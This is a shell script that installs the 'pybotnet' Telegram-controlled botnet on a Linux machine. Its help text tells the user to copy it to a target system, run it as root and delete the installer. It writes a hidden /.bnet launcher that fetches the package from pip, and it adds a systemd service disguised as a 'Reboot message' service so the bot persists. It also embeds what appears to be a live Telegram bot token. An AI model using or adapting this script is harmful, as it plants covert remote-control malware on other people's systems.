#!/bin/sh
## add pybotnet to linux systemd service ##

# --HELP--:
# replace youre telegram_bot_token, admin_id and with your own;
# copy this file to target system;
# run this file as root;
# remove install.sh from target system;

telegram_bot_token=5526760482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
admin_id=7902347166

bot_name=example_bot_name


botnet="/.bnet"
echo "create botnet script in ${botnet}"

tee<<EOF > $botnet
#!/bin/sh
apt update && apt install python3-pip -y && apt install python3-dev -y && pip3 install pybotnet -U --pre && python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name -v
EOF

chmod +x $botnet

echo "add bnet service to systemd"
tee<<EOF > /etc/systemd/system/bnet.service
[Unit]
Description=Reboot message systemd service.
[Service]
Type=simple
ExecStart=/bin/sh $botnet
[Install]
WantedBy=multi-user.target
EOF

echo "start bnet service"
chmod 644 /etc/systemd/system/bnet.service
systemctl daemon-reload
systemctl enable bnet.service
systemctl restart bnet.service
